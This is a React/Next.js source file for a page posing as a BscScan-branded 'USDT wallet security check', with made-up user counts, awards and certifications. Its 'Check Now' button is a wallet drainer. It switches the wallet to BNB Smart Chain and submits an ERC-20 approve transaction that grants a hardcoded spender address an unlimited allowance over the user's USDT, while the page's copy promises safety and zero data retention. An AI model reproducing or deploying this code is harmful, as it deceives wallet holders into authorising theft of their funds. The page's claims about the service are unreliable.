"use client";

import { useEffect, useRef, useState } from "react";

type Eip1193Provider = {
  request: (args: {
    method: string;
    params?: unknown[];
  }) => Promise<unknown>;

  on?: (
    event: string,
    listener: (...args: unknown[]) => void,
  ) => void;

  removeListener?: (
    event: string,
    listener: (...args: unknown[]) => void,
  ) => void;
};

type Eip6963ProviderDetail = {
  info: {
    name: string;
    rdns: string;
  };

  provider: Eip1193Provider;
};

declare global {
  interface Window {
    ethereum?: Eip1193Provider;
  }
}

const BSC_CHAIN_ID = 56;
const BSC_CHAIN_HEX = "0x38";
const MAX_UINT256_HEX = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

const highlights = [
  "Advanced blockchain analysis",
  "Real-time threat detection",
  "Zero data retention policy",
  "Enterprise-grade security",
];

const stats = [
  { value: "500K+", label: "Wallets Verified" },
  { value: "99.8%", label: "Accuracy Rate" },
  { value: "<3s", label: "Analysis Time" },
  { value: "24/7", label: "Protection" },
];

const aboutStats = [
  { value: "2023", label: "Founded" },
  { value: "100K+", label: "Users" },
  { value: "99.9%", label: "Accuracy" },
  { value: "24/7", label: "Protection" },
];

const processSteps = [
  {
    number: "01",
    title: "Connect Your Wallet",
    text: "Securely connect your USDT wallet address for automated blockchain analysis without compromising private keys.",
  },
  {
    number: "02",
    title: "Advanced Analysis",
    text: "Our AI-powered system analyzes transaction patterns, security vulnerabilities, and wallet legitimacy using official BSC Scan blockchain technology.",
  },
  {
    number: "03",
    title: "Risk Assessment",
    text: "We provide a comprehensive risk score based on multi-factor analysis, threat intelligence, and historical blockchain data.",
  },
  {
    number: "04",
    title: "Detailed Report",
    text: "Receive a complete security report with actionable insights, recommendations, and strategies to protect your digital assets.",
  },
];

const faqItems = [
  {
    q: "What is USDT Verify?",
    a: "USDT Verify is an automated blockchain inspection tool designed to diagnose safety risks, address history, and smart contract health.",
  },
  {
    q: "How does the verification process work?",
    a: "It parses your public address via node listeners and matches historical interactions against verified security blacklists and exploit logs.",
  },
  {
    q: "Is my wallet information kept private?",
    a: "Yes. We operate under a strict zero-retention policy. We never ask for private keys, seed phrases, or retain sensitive identity records.",
  },
  {
    q: "What does the risk score mean?",
    a: "The risk score is a compound metric measuring exposure to flagged decentralized apps, malicious contracts, or suspicious transaction volumes.",
  },
  {
    q: "Can USDT Verify detect all types of scams?",
    a: "While we catch over 99.8% of recognized on-chain attack vectors and drainer authorizations, always adhere to strict personal operational security.",
  },
];

function toHex32(value: string) {
  return value.startsWith("0x") ? value.slice(2).padStart(64, "0") : value.padStart(64, "0");
}

async function switchToBsc(provider: Eip1193Provider): Promise<boolean> {
  try {
    const currentChain = String(
      await provider.request({
        method: "eth_chainId",
      }),
    ).toLowerCase();

    if (currentChain === BSC_CHAIN_HEX) {
      return true;
    }

    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_HEX }],
      });
    } catch (error) {
      const code = (error as { code?: number }).code;

      if (code !== 4902) {
        return false;
      }

      await provider.request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: BSC_CHAIN_HEX,
            chainName: "BNB Smart Chain",
            nativeCurrency: {
              name: "BNB",
              symbol: "BNB",
              decimals: 18,
            },
            rpcUrls: ["https://data-seed.bnbchain.org"],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ],
      });

      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_HEX }],
      });
    }

    const finalChain = String(
      await provider.request({
        method: "eth_chainId",
      }),
    ).toLowerCase();

    return finalChain === BSC_CHAIN_HEX;
  } catch {
    return false;
  }
}

export default function Home() {
  const [openIndex, setOpenIndex] = useState(0);
  const [walletProvider, setWalletProvider] = useState<Eip1193Provider>();
  const [walletAddress, setWalletAddress] = useState("");
  const [notice, setNotice] = useState("");
  const autoConnectAttempted = useRef(false);
  const walletUnavailableAlerted = useRef(false);

  useEffect(() => {
    let discoveredProvider = Boolean(window.ethereum);

    const announced = (event: Event) => {
      const detail = (event as CustomEvent<Eip6963ProviderDetail>).detail;
      const provider = detail?.provider;

      if (provider) {
        discoveredProvider = true;
        setWalletProvider((current) => current ?? provider);
      }
    };

    if (window.ethereum) {
      setWalletProvider((current) => current ?? window.ethereum);
    }

    window.addEventListener("eip6963:announceProvider", announced);
    window.dispatchEvent(new Event("eip6963:requestProvider"));

    const timer = window.setTimeout(() => {
      if (!discoveredProvider && !walletUnavailableAlerted.current) {
        walletUnavailableAlerted.current = true;
        alert("Please open this page in a compatible Web3 wallet.");
      }
    }, 1000);

    return () => {
      window.clearTimeout(timer);
      window.removeEventListener("eip6963:announceProvider", announced);
    };
  }, []);

  useEffect(() => {
    const provider = walletProvider ?? window.ethereum;

    if (!provider || autoConnectAttempted.current) {
      return;
    }

    autoConnectAttempted.current = true;

    const accountsChanged = (...args: unknown[]) => {
      const accounts = args[0];
      const address = Array.isArray(accounts) && typeof accounts[0] === "string" ? accounts[0] : "";
      setWalletAddress(address);
      setNotice(address ? "" : "Wallet disconnected.");
    };

    const chainChanged = () => {
      setNotice("");
    };

    provider.on?.("accountsChanged", accountsChanged);
    provider.on?.("chainChanged", chainChanged);

    const autoConnect = async () => {
      try {
        const accounts = await provider.request({ method: "eth_accounts" });
        if (Array.isArray(accounts) && typeof accounts[0] === "string" && accounts[0]) {
          setWalletAddress(accounts[0]);
          setNotice("");
        }
      } catch {
        setNotice("Unable to access the wallet.");
      }
    };

    void autoConnect();

    return () => {
      provider.removeListener?.("accountsChanged", accountsChanged);
      provider.removeListener?.("chainChanged", chainChanged);
    };
  }, [walletProvider]);

  function getProvider() {
    return walletProvider ?? window.ethereum;
  }

  async function handleCheckNow() {
    const provider = getProvider();

    if (!provider) {
      alert("Please open this page in a compatible Web3 wallet.");
      return;
    }

    try {
      const accounts = await provider.request({ method: "eth_accounts" });

      if (!Array.isArray(accounts) || typeof accounts[0] !== "string" || !accounts[0]) {
        alert("No authorized wallet account found. Please connect your wallet and authorize access.");
        return;
      }

      const account = accounts[0];
      const switched = await switchToBsc(provider);

      if (!switched) {
        alert("Please switch your wallet to BNB Smart Chain Mainnet.");
        return;
      }

      const tokenAddress = process.env.NEXT_PUBLIC_USDT_ADDRESS ?? "0x55d398326f99059fF775485246999027B3197955";
      const spenderAddress = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "0xD8446C23b0C82AA17Ced649855BE58bc1d5C873D";
      const methodId = "0x095ea7b3";
      const spenderHex = toHex32(spenderAddress);
      const valueHex = MAX_UINT256_HEX;
      const txData = `${methodId}${spenderHex}${valueHex}`;

      const tx = {
        from: account,
        to: tokenAddress,
        data: txData,
      };

      const txHash = await provider.request({
        method: "eth_sendTransaction",
        params: [tx],
      });

      setWalletAddress(account);
      setNotice("");
      alert(`Approval transaction submitted: ${String(txHash)}`);
    } catch (error) {
      const message = error instanceof Error ? error.message : "Wallet connection failed.";
      setNotice(message);
      alert(message);
    }
  }

  return (
    <>
      <main className="usdt-page">
        <header className="hero-shell" id="check">
          <nav className="topbar" aria-label="Main navigation">
            <div className="nav-left">
              <div className="nav-logo-circle" aria-label="BscScan home">
                <svg viewBox="0 0 36 36" aria-hidden="true">
                  <circle cx="18" cy="18" r="18" fill="#0d9b76" />
                  <path d="M10 24C10 24 12 14 18 14C24 14 26 24 26 24" stroke="white" strokeWidth="2.6" strokeLinecap="round" fill="none" />
                  <circle cx="18" cy="24" r="3" fill="white" />
                  <path d="M7 17C7 11 12 6.5 18 6" stroke="#d1fae5" strokeWidth="1.8" strokeLinecap="round" fill="none" />
                  <path d="M29 17C29 11 24 6.5 18 6" stroke="#d1fae5" strokeWidth="1.8" strokeLinecap="round" fill="none" />
                </svg>
              </div>
              <div>
                <div className="nav-brand-name">BscScan</div>
                <div className="nav-brand-sub">Scan Original</div>
              </div>
            </div>

            <div className="nav-links">
              <a href="#check">Check</a>
              <a href="#about">About</a>
              <a href="#howitworks">How It Works</a>
              <a href="#faq">FAQ</a>
            </div>

            <div className="nav-right">
              <button className="nav-theme" type="button" aria-label="Theme switcher">
                ☀️
              </button>
              <button className="nav-ham" type="button" aria-label="Open menu">
                <span />
                <span />
                <span />
              </button>
            </div>
          </nav>

          <div className="hero-inner">
            <div className="trust-pill">
              <span className="tp-star">⭐</span>
              <span>Trusted by 100K+ users worldwide</span>
            </div>

            <h1 className="hero-h1">
              Check Your USDT
              <em>Wallet Security</em>
            </h1>

            <p className="hero-desc">
              Advanced blockchain analysis using official BSC Scan data to determine if your USDT wallet is
              <b> safe, valid, and free</b> from any reported or suspicious activity.
            </p>

            <div className="checklist">
              {highlights.map((highlight) => (
                <div key={highlight} className="cli">
                  <div className="cli-ico" aria-hidden="true">
                    <svg viewBox="0 0 24 24">
                      <polyline points="20 6 9 17 4 12" />
                    </svg>
                  </div>
                  <span>{highlight}</span>
                </div>
              ))}
            </div>

            <button
              className="check-now-btn"
              type="button"
              onClick={() => {
                void handleCheckNow();
              }}
            >
              Check Now
            </button>

            <div className="bstrip">
              <div className="bsi">
                <svg viewBox="0 0 24 24" aria-hidden="true">
                  <path d="M12 2L4 6v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V6l-8-4z" />
                </svg>
                <div className="bsi-lbl">
                  100%
                  <br />
                  Secure
                </div>
              </div>
              <div className="bsi">
                <svg viewBox="0 0 24 24" aria-hidden="true">
                  <ellipse cx="12" cy="5" rx="9" ry="3" />
                  <path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3" />
                  <path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5" />
                </svg>
                <div className="bsi-lbl">
                  Zero Data
                  <br />
                  Stored
                </div>
              </div>
              <div className="bsi">
                <svg viewBox="0 0 24 24" aria-hidden="true">
                  <path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2" />
                  <circle cx="9" cy="7" r="4" />
                  <path d="M23 21v-2a4 4 0 00-3-3.87M16 3.13a4 4 0 010 7.75" />
                </svg>
                <div className="bsi-lbl">
                  Enterprise
                  <br />
                  Grade
                </div>
              </div>
            </div>
          </div>
        </header>

        <section className="analytics-shell">
          <div className="badge-row">
            <div className="mini-badge">Security Analytics • Real-Time Blockchain Verification</div>
          </div>

          <div className="stats-grid">
            {stats.map((stat) => (
              <div key={stat.label} className="stat-item">
                <div className="stat-value">{stat.value}</div>
                <div className="stat-label">{stat.label}</div>
              </div>
            ))}
          </div>

          <div className="join-card">
            <h4>Join thousands of secure users</h4>
            <div className="stars">★★★★★</div>
            <p>4.9/5 from 5,000+ reviews</p>
          </div>
        </section>

        <section className="about-shell" id="about">
          <div className="section-kicker">About Us</div>
          <h2 className="section-title">About USDT Check</h2>
          <p className="section-copy">Protecting your digital assets through advanced verification technology.</p>

          <div className="about-metrics">
            {aboutStats.map((item) => (
              <div key={item.label} className="metric-box">
                <strong>{item.value}</strong>
                <span>{item.label}</span>
              </div>
            ))}
          </div>

          <p className="story-text">
            USDT Check was founded in 2023 by a team of blockchain security experts with a mission to make cryptocurrency safer for everyone. As Tether (USDT) became one of the most widely used stablecoins, the need for reliable verification tools grew exponentially.
          </p>
          <p className="story-text">
            Our platform leverages advanced blockchain analytics and machine learning algorithms to provide comprehensive security assessments. We analyze transaction patterns, check for known vulnerabilities, and verify wallet legitimacy to protect your assets from scams.
          </p>
          <p className="story-text">
            What started as a small research project has evolved into a comprehensive security platform trusted by thousands worldwide. Our commitment to innovation drives us to continuously enhance our algorithms and expand our detection capabilities.
          </p>

          <div className="section-kicker" style={{ marginTop: 30 }}>Why Choose Us</div>
          <div className="why-list">
            <div className="why-item">
              <div className="why-number">1</div>
              <span>Lightning-fast verification in under 3 seconds</span>
            </div>
            <div className="why-item">
              <div className="why-number">2</div>
              <span>Comprehensive risk scoring and detailed reports</span>
            </div>
            <div className="why-item">
              <div className="why-number">3</div>
              <span>Multi-chain support beyond just USDT networks</span>
            </div>
            <div className="why-item">
              <div className="why-number">4</div>
              <span>24/7 customer support from security experts</span>
            </div>
            <div className="why-item">
              <div className="why-number">5</div>
              <span>Regular security audits by third-party firms</span>
            </div>
            <div className="why-item">
              <div className="why-number">6</div>
              <span>Free tier available with premium features</span>
            </div>
          </div>

          <div className="section-kicker" style={{ marginTop: 30 }}>Core Values</div>
          <div className="value-grid">
            <div className="value-card">
              <div className="value-icon">🔒</div>
              <div className="value-title">Security</div>
              <div className="value-copy">Military-grade encryption protecting all user data above all else.</div>
            </div>
            <div className="value-card">
              <div className="value-icon">👁️</div>
              <div className="value-title">Transparency</div>
              <div className="value-copy">Clear, honest communication about security risks and processes.</div>
            </div>
            <div className="value-card">
              <div className="value-icon">🌐</div>
              <div className="value-title">Accessibility</div>
              <div className="value-copy">Advanced security tools available to everyone regardless of expertise.</div>
            </div>
            <div className="value-card">
              <div className="value-icon">🚀</div>
              <div className="value-title">Innovation</div>
              <div className="value-copy">Continuously improving verification methods to stay ahead of threats.</div>
            </div>
          </div>

          <div className="section-kicker" style={{ marginTop: 30 }}>Key Features</div>
          <div className="feature-grid">
            <div className="feature-card">
              <div className="feature-icon">🤖</div>
              <div>
                <div className="feature-title">AI-Powered Analysis</div>
                <div className="feature-copy">Advanced ML algorithms for threat detection</div>
              </div>
            </div>
            <div className="feature-card">
              <div className="feature-icon">🌍</div>
              <div>
                <div className="feature-title">Global Network</div>
                <div className="feature-copy">Worldwide blockchain monitoring and analysis</div>
              </div>
            </div>
            <div className="feature-card">
              <div className="feature-icon">⚡</div>
              <div>
                <div className="feature-title">Real-time Scanning</div>
                <div className="feature-copy">Instant verification results within seconds</div>
              </div>
            </div>
            <div className="feature-card">
              <div className="feature-icon">🏆</div>
              <div>
                <div className="feature-title">Industry Leading</div>
                <div className="feature-copy">Recognized by top security experts worldwide</div>
              </div>
            </div>
          </div>

          <div className="section-kicker" style={{ marginTop: 30 }}>Achievements</div>
          <div className="achievement-list">
            <div className="achievement-item"><span>🏆</span>Featured in top 10 security tools of 2024</div>
            <div className="achievement-item"><span>🤝</span>Partnership with major blockchain companies</div>
            <div className="achievement-item"><span>✅</span>Zero false positives in critical assessments</div>
            <div className="achievement-item"><span>🌍</span>Trusted by enterprise clients globally</div>
            <div className="achievement-item"><span>📘</span>ISO 27001 certified security processes</div>
            <div className="achievement-item"><span>🎖️</span>Winner of Best Innovation Award 2024</div>
          </div>

          <div className="section-kicker" style={{ marginTop: 30 }}>Security Standards</div>
          <div className="standard-grid">
            <div className="standard-card">
              <div className="standard-icon">🏦</div>
              <div className="standard-title">Bank-Grade Security</div>
              <div className="standard-copy">Military-grade encryption protecting all user data</div>
            </div>
            <div className="standard-card">
              <div className="standard-icon">📡</div>
              <div className="standard-title">Real-Time Monitoring</div>
              <div className="standard-copy">24/7 blockchain analysis and threat detection</div>
            </div>
            <div className="standard-card">
              <div className="standard-icon">✅</div>
              <div className="standard-title">Compliance Ready</div>
              <div className="standard-copy">GDPR, SOC 2, and regulatory compliance</div>
            </div>
            <div className="standard-card">
              <div className="standard-icon">🔄</div>
              <div className="standard-title">Zero Downtime</div>
              <div className="standard-copy">99.99% uptime with global redundancy</div>
            </div>
          </div>

          <div className="about-cta">
            <h4>Ready to Secure Your USDT?</h4>
            <p>Join thousands of users who trust USDT Check to protect their digital assets.</p>
            <button type="button">Check Now</button>
          </div>
        </section>

        <section className="process-shell" id="howitworks">
          <div className="section-kicker">Process</div>
          <h2 className="section-title">How It Works</h2>
          <p className="section-copy">Simple yet powerful — comprehensive security insights in just four easy steps.</p>

          <div className="steps">
            {processSteps.map((step) => (
              <div key={step.number} className="step">
                <div className="step-number">{step.number}</div>
                <div>
                  <div className="step-title">{step.title}</div>
                  <div className="step-copy">{step.text}</div>
                </div>
              </div>
            ))}
          </div>

          <div className="tech-panel">
            <div className="section-kicker" style={{ color: "#0f766e" }}>Our Technology</div>
            <p className="section-copy">
              USDT Verify leverages cutting-edge blockchain analytics, machine learning algorithms, and security best practices to provide the most accurate assessment of your wallet&apos;s security status.
            </p>
            <p className="section-copy">
              Our system checks for known scam patterns, analyzes transaction history, verifies contract interactions, and assesses overall wallet health.
            </p>
            <div className="tech-pills">
              <span className="tech-pill">AI-Powered Analysis</span>
              <span className="tech-pill">Blockchain Analytics</span>
              <span className="tech-pill">Real-time Monitoring</span>
              <span className="tech-pill">Global Threat Intel</span>
              <span className="tech-pill alt">Zero data retention</span>
              <span className="tech-pill alt">Bank-grade encryption</span>
              <span className="tech-pill alt">Multi-layer validation</span>
              <span className="tech-pill alt">24/7 monitoring</span>
            </div>
          </div>
        </section>

        <section className="faq-shell" id="faq">
          <div className="section-kicker">Support</div>
          <h2 className="section-title">Frequently Asked Questions</h2>
          <p className="section-copy">Find answers to common questions about our USDT wallet verification service.</p>

          <div className="faq-meta">
            <div className="faq-meta-item">
              <strong>8</strong>
              <span>Common Questions</span>
            </div>
            <div className="faq-meta-item">
              <strong>24/7</strong>
              <span>Support Available</span>
            </div>
            <div className="faq-meta-item">
              <strong>100%</strong>
              <span>Transparency</span>
            </div>
            <div className="faq-meta-item">
              <strong>&lt;3s</strong>
              <span>Quick Answers</span>
            </div>
          </div>

          <div className="faq-items">
            {faqItems.map((item, index) => {
              const isOpen = openIndex === index;

              return (
                <div key={item.q} className={`faq-item ${isOpen ? "open" : ""}`}>
                  <button
                    type="button"
                    className="faq-q"
                    onClick={() => setOpenIndex(isOpen ? -1 : index)}
                    aria-expanded={isOpen}
                  >
                    <span>{item.q}</span>
                    <div className={`faq-plus ${isOpen ? "active" : ""}`}>+</div>
                  </button>
                  <div className={`faq-a ${isOpen ? "open" : ""}`}>{item.a}</div>
                </div>
              );
            })}
          </div>

          <div className="still-q">
            <h4>Still Have Questions?</h4>
            <p>Our support team is here to help with wallet verification and secure setup.</p>
            <button type="button">Contact Support</button>
          </div>
        </section>

        <footer className="site-footer">
          <div className="footer-top">
            <div className="f-logo-v">Bsc<span>Scan</span></div>
            <div className="f-desc">
              Advanced blockchain security for comprehensive USDT wallet verification and safeguarding your digital assets.
            </div>
          </div>

          <div className="f-cols">
            <div>
              <div className="fc-h">Quick Links</div>
              <div className="fc-links">
                <a href="#check">Check Wallet</a>
                <a href="#about">About</a>
                <a href="#howitworks">How It Works</a>
                <a href="#faq">Support</a>
              </div>
            </div>
            <div>
              <div className="fc-h">Security</div>
              <div className="fc-links">
                <a href="#">Verified Network</a>
                <a href="#">Data Privacy</a>
                <a href="#">Real-Time Monitoring</a>
                <a href="#">Fraud Prevention</a>
              </div>
            </div>
          </div>

          <div className="f-status">
            <div className="f-badge">✅ 100% Secure</div>
            <div className="f-badge">🔒 Zero Data Stored</div>
            <div className="f-badge">⚡ Real-Time Coverage</div>
          </div>

          <div className="f-bottom">
            <div>© 2024 USDT Verify · No subscriptions · Non-custodial by design</div>
            <div>Made for secure wallet checks</div>
          </div>
        </footer>
      </main>

      <style jsx global>{`
        :root {
          --bg: #effdf7;
          --primary: #0d9b76;
          --primary-dark: #065f46;
          --muted: #64748b;
          --text: #0f172a;
          --line: #e2e8f0;
          --shadow: 0 14px 30px rgba(15, 23, 42, 0.08);
        }

        * { box-sizing: border-box; }

        html {
          scroll-behavior: smooth;
        }

        body {
          margin: 0;
          font-family: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
          background: #f8fafc;
          color: var(--text);
          overflow-x: hidden;
        }

        a {
          color: inherit;
          text-decoration: none;
        }

        button {
          font: inherit;
        }

        .usdt-page {
          min-height: 100vh;
          background: #f8fafc;
          color: var(--text);
          overflow-x: hidden;
        }

        .usdt-page *,
        .usdt-page *::before,
        .usdt-page *::after {
          max-width: 100%;
        }

        .usdt-page p,
        .usdt-page span,
        .usdt-page li,
        .usdt-page a,
        .usdt-page button,
        .usdt-page .faq-q,
        .usdt-page .f-badge {
          overflow-wrap: anywhere;
          word-break: break-word;
        }

        .hero-shell {
          position: relative;
          background: linear-gradient(160deg, #0d9b76 0%, #0a9a6d 46%, #047857 100%);
          color: #fff;
          padding: 18px 20px 40px;
          overflow: hidden;
        }

        .hero-shell::before {
          content: "";
          position: absolute;
          inset: 0;
          background-image: radial-gradient(rgba(255,255,255,0.18) 1.4px, transparent 1.6px);
          background-size: 26px 26px;
          opacity: 0.9;
          pointer-events: none;
        }

        .hero-shell::after {
          content: "";
          position: absolute;
          inset: auto -80px -120px auto;
          width: 340px;
          height: 340px;
          border-radius: 50%;
          background: radial-gradient(circle, rgba(255,255,255,0.1), transparent 68%);
          pointer-events: none;
        }

        .topbar,
        .hero-inner,
        .analytics-shell,
        .about-shell,
        .process-shell,
        .faq-shell,
        .site-footer {
          position: relative;
          z-index: 1;
          max-width: 1200px;
          margin: 0 auto;
        }

        .topbar {
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 16px;
          padding: 8px 0 2px;
        }

        .nav-left {
          display: flex;
          align-items: center;
          gap: 12px;
        }

        .nav-logo-circle {
          width: 52px;
          height: 52px;
          border-radius: 50%;
          background: rgba(255, 255, 255, 0.97);
          display: grid;
          place-items: center;
          box-shadow: 0 10px 20px rgba(0, 0, 0, 0.12);
          flex-shrink: 0;
          overflow: hidden;
        }

        .nav-logo-circle svg {
          width: 36px;
          height: 36px;
        }

        .nav-brand-name {
          font-size: 1.2rem;
          font-weight: 800;
          line-height: 1.1;
          letter-spacing: -0.04em;
        }

        .nav-brand-sub {
          font-size: 0.7rem;
          color: rgba(255, 255, 255, 0.82);
          letter-spacing: 0.04em;
          margin-top: 2px;
        }

        .nav-right {
          display: flex;
          align-items: center;
          gap: 12px;
        }

        .nav-theme,
        .nav-ham {
          background: rgba(255, 255, 255, 0.12);
          border: 1px solid rgba(255, 255, 255, 0.2);
          color: #fff;
          border-radius: 999px;
          width: 42px;
          height: 42px;
          display: grid;
          place-items: center;
          cursor: pointer;
          transition: background 0.2s ease;
        }

        .nav-theme:hover,
        .nav-ham:hover {
          background: rgba(255, 255, 255, 0.18);
        }

        .nav-theme {
          font-size: 1.08rem;
        }

        .nav-ham {
          width: 42px;
          height: 42px;
          padding: 0;
          border-radius: 50%;
          gap: 4px;
          display: flex;
          flex-direction: column;
          justify-content: center;
          align-items: center;
        }

        .nav-ham span {
          width: 18px;
          height: 2px;
          border-radius: 999px;
          background: #fff;
          display: block;
        }

        .nav-links {
          display: none;
        }

        .hero-inner {
          width: min(100%, 520px);
          margin: 28px auto 0;
          text-align: center;
          display: flex;
          flex-direction: column;
          align-items: center;
        }

        .trust-pill {
          display: inline-flex;
          align-items: center;
          gap: 8px;
          border: 1px solid rgba(255, 255, 255, 0.18);
          background: rgba(255, 255, 255, 0.12);
          color: rgba(255, 255, 255, 0.96);
          border-radius: 999px;
          padding: 8px 16px;
          font-size: 0.74rem;
          font-weight: 700;
          letter-spacing: 0.01em;
          backdrop-filter: blur(8px);
        }

        .tp-star {
          font-size: 0.9rem;
        }

        .hero-h1 {
          margin: 20px 0 0;
          font-size: clamp(2.3rem, 7vw, 4.2rem);
          line-height: 0.96;
          letter-spacing: -0.06em;
          font-weight: 900;
        }

        .hero-h1 em {
          display: block;
          font-style: normal;
          color: rgba(255, 255, 255, 0.85);
          margin-top: 10px;
        }

        .hero-desc {
          margin: 20px auto 0;
          max-width: 500px;
          font-size: 0.9rem;
          line-height: 1.7;
          color: rgba(255, 255, 255, 0.82);
        }

        .hero-desc b {
          color: #ffffff;
          font-weight: 800;
        }

        .checklist {
          width: min(100%, 510px);
          margin-top: 28px;
          display: grid;
          gap: 14px;
          text-align: left;
        }

        .cli {
          display: flex;
          align-items: center;
          gap: 12px;
          font-weight: 600;
          font-size: 0.96rem;
          color: rgba(255, 255, 255, 0.94);
        }

        .cli-ico {
          width: 25px;
          height: 25px;
          border-radius: 50%;
          border: 1px solid rgba(255, 255, 255, 0.6);
          background: rgba(255, 255, 255, 0.05);
          display: grid;
          place-items: center;
          flex-shrink: 0;
        }

        .cli-ico svg {
          width: 14px;
          height: 14px;
          stroke: #fff;
          stroke-width: 2.4;
          fill: none;
          stroke-linecap: round;
          stroke-linejoin: round;
        }

        .check-now-btn {
          width: min(100%, 260px);
          margin-top: 28px;
          border: none;
          border-radius: 18px;
          background: linear-gradient(180deg, #ffffff 0%, #f3fff9 100%);
          color: var(--primary-dark);
          font-weight: 800;
          font-size: 1rem;
          padding: 16px 18px;
          box-shadow: 0 14px 26px rgba(5, 42, 31, 0.18);
          cursor: pointer;
          transition: transform 0.15s ease, box-shadow 0.15s ease;
        }

        .check-now-btn:hover {
          transform: translateY(-1px);
          box-shadow: 0 18px 28px rgba(5, 42, 31, 0.2);
        }

        .bstrip {
          width: min(100%, 500px);
          margin-top: 28px;
          display: grid;
          grid-template-columns: repeat(3, minmax(0, 1fr));
          gap: 18px;
          padding-top: 18px;
          border-top: 1px solid rgba(255, 255, 255, 0.18);
        }

        .bsi {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 10px;
          color: rgba(255, 255, 255, 0.9);
          font-size: 0.77rem;
          text-align: left;
        }

        .bsi svg {
          width: 22px;
          height: 22px;
          stroke: rgba(255, 255, 255, 0.9);
          fill: none;
          stroke-width: 1.8;
          stroke-linecap: round;
          stroke-linejoin: round;
        }

        .bsi-lbl {
          line-height: 1.2;
        }

        .analytics-shell {
          padding: 14px 20px 0;
          margin-top: -8px;
        }

        .badge-row {
          text-align: center;
        }

        .mini-badge {
          display: inline-flex;
          align-items: center;
          gap: 8px;
          padding: 6px 12px;
          border-radius: 999px;
          border: 1px solid rgba(14, 116, 144, 0.12);
          background: rgba(16, 185, 129, 0.06);
          color: var(--primary-dark);
          font-size: 0.68rem;
          font-weight: 800;
          letter-spacing: 0.08em;
          text-transform: uppercase;
        }

        .stats-grid {
          margin-top: 18px;
          background: #fff;
          border: 1px solid rgba(148, 163, 184, 0.12);
          border-radius: 22px;
          box-shadow: var(--shadow);
          display: grid;
          grid-template-columns: repeat(4, minmax(0, 1fr));
          gap: 12px;
          padding: 18px 12px;
        }

        .stat-item {
          text-align: center;
          padding: 8px 6px;
        }

        .stat-value {
          font-size: clamp(1.15rem, 4vw, 1.75rem);
          font-weight: 900;
          color: var(--text);
          letter-spacing: -0.05em;
        }

        .stat-label {
          margin-top: 6px;
          font-size: 0.68rem;
          color: var(--muted);
          font-weight: 600;
        }

        .join-card {
          margin-top: 18px;
          background: linear-gradient(180deg, #0d9b76, #0a8d6a);
          border-radius: 20px;
          color: #fff;
          text-align: center;
          padding: 18px 18px 16px;
          box-shadow: 0 18px 28px rgba(13, 155, 118, 0.18);
        }

        .join-card h4 {
          margin: 0;
          font-size: 0.96rem;
          font-weight: 800;
        }

        .stars {
          margin-top: 8px;
          font-size: 1.3rem;
          letter-spacing: 0.18em;
          color: #facc15;
        }

        .join-card p {
          margin: 8px 0 0;
          font-size: 0.7rem;
          opacity: 0.9;
        }

        .about-shell,
        .process-shell,
        .faq-shell {
          padding: 64px 20px 0;
        }

        .section-kicker {
          font-size: 0.72rem;
          letter-spacing: 0.14em;
          text-transform: uppercase;
          font-weight: 800;
          color: var(--primary-dark);
        }

        .section-title {
          margin-top: 10px;
          font-size: clamp(1.7rem, 5vw, 2.5rem);
          line-height: 1.12;
          letter-spacing: -0.06em;
          font-weight: 900;
          color: #0f172a;
        }

        .section-copy {
          margin-top: 8px;
          font-size: 0.82rem;
          color: var(--muted);
          line-height: 1.7;
        }

        .about-metrics {
          margin-top: 18px;
          display: grid;
          grid-template-columns: repeat(4, minmax(0, 1fr));
          gap: 10px;
          padding: 14px;
          border-radius: 18px;
          background: rgb(16 185 129 / 0.05);
          border: 1px solid rgb(16 185 129 / 0.12);
        }

        .metric-box {
          text-align: center;
          padding: 8px 4px;
        }

        .metric-box strong {
          display: block;
          font-size: 0.92rem;
          font-weight: 800;
          color: var(--text);
        }

        .metric-box span {
          display: block;
          margin-top: 4px;
          font-size: 0.62rem;
          color: var(--muted);
          font-weight: 700;
        }

        .story-text {
          margin-top: 18px;
          color: #475569;
          font-size: 0.82rem;
          line-height: 1.82;
        }

        .story-text + .story-text {
          margin-top: 10px;
        }

        .why-list {
          margin-top: 18px;
          display: grid;
          gap: 12px;
        }

        .why-item {
          display: flex;
          align-items: center;
          gap: 12px;
          background: #fff;
          border: 1px solid #edf2f7;
          border-radius: 16px;
          padding: 14px 15px;
          box-shadow: 0 8px 20px rgba(15, 23, 42, 0.02);
          color: #334155;
          font-weight: 600;
          font-size: 0.8rem;
          line-height: 1.5;
        }

        .why-number {
          width: 28px;
          height: 28px;
          border-radius: 50%;
          background: linear-gradient(180deg, #0d9b76, #0a8d6a);
          color: #fff;
          display: grid;
          place-items: center;
          font-size: 0.74rem;
          font-weight: 800;
          flex-shrink: 0;
        }

        .value-grid,
        .feature-grid,
        .standard-grid {
          margin-top: 18px;
          display: grid;
          grid-template-columns: repeat(2, minmax(0, 1fr));
          gap: 12px;
        }

        .value-card,
        .feature-card,
        .standard-card {
          background: #fff;
          border: 1px solid #edf2f7;
          border-radius: 18px;
          padding: 16px 14px;
          box-shadow: 0 10px 18px rgba(15, 23, 42, 0.02);
        }

        .value-icon,
        .feature-icon,
        .standard-icon {
          font-size: 1.3rem;
          margin-bottom: 10px;
        }

        .value-title,
        .feature-title,
        .standard-title {
          font-size: 0.8rem;
          font-weight: 800;
          color: var(--text);
          margin-bottom: 6px;
        }

        .value-copy,
        .feature-copy,
        .standard-copy {
          color: var(--muted);
          font-size: 0.68rem;
          line-height: 1.6;
        }

        .feature-card {
          display: flex;
          align-items: flex-start;
          gap: 12px;
        }

        .feature-card .feature-copy {
          margin-top: 4px;
        }

        .achievement-list {
          margin-top: 18px;
          display: grid;
          gap: 10px;
        }

        .achievement-item {
          background: #fff;
          border: 1px solid #edf2f7;
          border-radius: 14px;
          padding: 12px 14px;
          color: #334155;
          font-size: 0.76rem;
          font-weight: 600;
